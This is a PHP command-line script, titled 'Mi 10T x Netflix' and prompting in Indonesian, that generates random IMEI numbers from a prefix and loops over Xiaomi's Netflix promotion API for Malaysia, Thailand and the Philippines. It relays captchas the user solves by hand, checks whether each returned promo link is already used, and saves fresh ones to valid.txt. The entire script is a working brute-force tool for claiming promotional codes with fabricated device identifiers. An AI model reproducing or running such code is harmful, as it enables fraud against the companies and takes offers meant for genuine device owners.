<?php
 
$__uid = 'c'.mt_rand(10, 99).'e-e'.mt_rand(10, 99).'1-i'.mt_rand(10, 99).'k-a' . mt_rand(100, 999);
$__imei = '86622805';
$__length = 7;
$__region = '';
 
function http_request($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
 
function randNumber($length) {
    $result = '';
    for($i = 0; $i < $length; $i++) {
        $result .= mt_rand(0, 9);
    }
    return $result;
}
 
$__stopped=false;$ii=0;
 
echo 'Mi 10T x Netflix'. PHP_EOL;
echo 'Support: MY TH PH'. PHP_EOL;
echo '-----------------'. PHP_EOL;
sleep(1);
echo '> Input UID (optional): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
    $__uid=$answer;
}
sleep(1);
echo '> Input awalan IMEI ('.$__imei.'): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
    $__imei=$answer;
}
sleep(1);
echo '> Input panjang random IMEI ('.$__length.'): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
    $__length=(int)$answer;
}
sleep(1);
$__setting = [
    ['my', '', 'Malaysia', 'https://hd.c.mi.com/my/eventapi/api/aptcha/index?type=netflix&uid='.$__uid],
    ['th', '', 'Thailand', 'https://hd.c.mi.com/th/eventapi/api/aptcha/index?type=netflix&uid='.$__uid],
    ['ph', '', 'Philippines', 'https://hd.c.mi.com/ph/eventapi/api/aptcha/index?type=netflix&uid='.$__uid]
];
echo '(0) '.$__setting[0][2] . PHP_EOL;
echo '(1) '.$__setting[1][2] . PHP_EOL;
echo '(2) '.$__setting[2][2] . PHP_EOL;
echo '> Input Region (Enter for all region): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer=='') {
    $__region='All region';
} else {
    $__setting_temp=$__setting;
    $__setting=[];
    $__setting[]=$__setting_temp[(int)$answer];
    $__region=$__setting[0][2];
}
echo '[x] UID anda: ' . $__uid . PHP_EOL;
echo '[x] Awalan IMEI: ' . $__imei . PHP_EOL;
echo '[x] Panjang random IMEI: ' . $__length . PHP_EOL;
echo '[x] Region: ' . $__region . PHP_EOL;
sleep(1);
echo 'Input captcha akan muncul 3x.' . PHP_EOL;
echo 'Buka link dibawah ini, lalu input captchanya.' . PHP_EOL;
 
sleep(1);
foreach ($__setting as $sett) {
    echo '[' . $sett[2] . '] Challenge the captcha' . PHP_EOL;
    echo '=> ' . $sett[3] . PHP_EOL;
    echo '> Input captcha : ';
    $input = fopen("php://stdin","r");
    $answer = trim(fgets($input));
    $__setting[$ii][1] = $answer;
    $ii++;
}
sleep(1);
echo '[READY]' . PHP_EOL;
sleep(1);
while(1) {
    $imei = $__imei . randNumber($__length);
    if($__stopped) {
        break;
    }
    $ii=0;
    foreach ($__setting as $sett) {
        $data = http_request('https://hd.c.mi.com/'.$sett[0].'/eventapi/api/netflix/gettoken?uid='.$__uid.'&vcode='.$sett[1].'&imei='.$imei);
        $data = json_decode($data, true);
        if (isset($data['msg']) && $data['msg'] == 'Success') {
            $__if_valid = $data['data']['redirect_url'] . '|' . $imei . '|' . $sett[2] . PHP_EOL;
            $data_n = http_request($data['data']['redirect_url']);
            if(strpos($data_n, 'has already been used')) {
                echo 'USED => ' . $__if_valid;
            } else {
                file_put_contents("valid.txt", $__if_valid, FILE_APPEND);
                echo 'FRESH => ' . $__if_valid;
            }
        } else if(isset($data['code']) && $data['code'] == '800706') {
            echo '[' . $sett[2] . '] Challenge the captcha again' . PHP_EOL;
            echo '=> ' . $sett[3] . PHP_EOL;
            echo '> Input new captcha : ';
            $input = fopen("php://stdin","r");
            $answer = trim(fgets($input));
            $__setting[$ii][1] = $answer;
            echo 'New captcha saved.' . PHP_EOL;
        } else if(isset($data['code']) && $data['code'] == '800707' || $data['code'] == '800708') {
            echo 'INVALID => ' . $imei . '|' . $sett[2] . PHP_EOL;
        } else {
            echo 'An unexpected error has occured.' . PHP_EOL;
        }
        $ii++;
    }
}
 
